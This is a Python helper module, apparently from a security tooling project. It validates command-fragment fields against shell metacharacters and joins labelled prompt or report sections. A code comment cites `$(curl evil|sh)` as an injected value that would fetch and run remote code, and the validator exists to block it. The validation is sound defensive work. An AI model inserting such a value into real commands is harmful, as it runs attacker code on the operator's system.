"""Small text-composition helpers for prompt and report assembly.

The graph builds prompts from labelled sections and reports build Markdown from
the same shape; these two helpers are the shared kernel so neither hand-rolls
the empty-body guard or the blank-line join.
"""

from __future__ import annotations

import re

# Path/flag-safe characters for a cheatsheet-rendered field, and the stricter
# set for an output-filename label. The `cmd` renderer appends output_dir/flag/
# label UNQUOTED (so the operator's shell expands the sanctioned `$(date …)`/
# `${target}`); without this, a tools.json/commands.json field of
# `$(curl evil|sh)` would render a pasteable, "in scope" command that runs
# arbitrary code. See skuggi.frontend.commands and skuggi.tooling.registry.
_SAFE_FRAGMENT = re.compile(r"^[A-Za-z0-9_./=-]+$")
_SAFE_LABEL = re.compile(r"^[A-Za-z0-9_-]+$")


def safe_cmd_fragment(
    value: str | None, *, field: str, strict: bool = False
) -> str | None:
    """Reject shell metacharacters in a value the `cmd` renderer leaves unquoted.

    Empty/``None`` passes (the field is optional) and is returned unchanged so a
    ``None`` sentinel keeps its "fall back to the tool spec" meaning; otherwise
    the value must be wholly path-safe (``strict`` tightens it to a bare label:
    no ``/`` ``.`` ``=``). Raises ``ValueError`` so a bad spec fails at model load.
    """
    if value:
        pattern = _SAFE_LABEL if strict else _SAFE_FRAGMENT
        if not pattern.match(value):
            msg = f"{field} contains unsafe characters: {value!r}"
            raise ValueError(msg)
    return value


def labeled(label: str, body: str, *, heading: bool = False) -> str:
    """A labelled section, or '' when the body is blank.

    ``heading`` picks the format: a Markdown ``## label`` (reports) or a plain
    ``label:`` (prompts).
    """
    if not body.strip():
        return ""
    return f"## {label}\n\n{body}" if heading else f"{label}:\n{body}"


def join_blocks(*blocks: str) -> str:
    """Join non-empty blocks with a blank line between them."""
    return "\n\n".join(block for block in blocks if block)
